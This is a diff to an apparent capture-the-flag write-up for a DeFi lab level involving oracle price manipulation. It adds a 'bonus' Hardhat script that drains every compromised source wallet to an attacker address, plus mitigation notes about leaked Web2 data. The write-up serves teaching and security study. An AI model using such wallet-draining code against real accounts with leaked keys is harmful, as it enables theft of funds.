@@ -362,7 +362,29 @@ This process can be done with this script:
 
         // Placing the NFT price back to its older price.
         await manipulatePrice("999");
+⠀
+⠀
+
+
+**Bonus Track**
+
+This level leaves a bonus track that can be done as an easter egg! It does not checks the final balance of each source... but we can also drain them by calling the following script!
+
+        // BONUS. We can also drain each source address!
+        const drainSources = async () => {
+            for(const wallet of sourceWallets){
+
+                let walletBalance = await ethers.provider.getBalance(wallet.address)
+                await wallet.sendTransaction({to: attacker.address, value: walletBalance})
+                walletBalance = await ethers.provider.getBalance(wallet.address)
+                expect(walletBalance).to.equal(0);
+            }
+            console.log("Successfully drained each source!")
+        }
+        await drainSources();
 
 ### Learnings - Mitigations
 - The main vulnerability in here is the Web2-side of the project. While using sensible data, it is advised to use one way encoded formats of that data in order to prevent this scenarios.
 - Knowing how and what information is available to be queried from our server also helps.
+
+**The contracts are not always the weak point!**
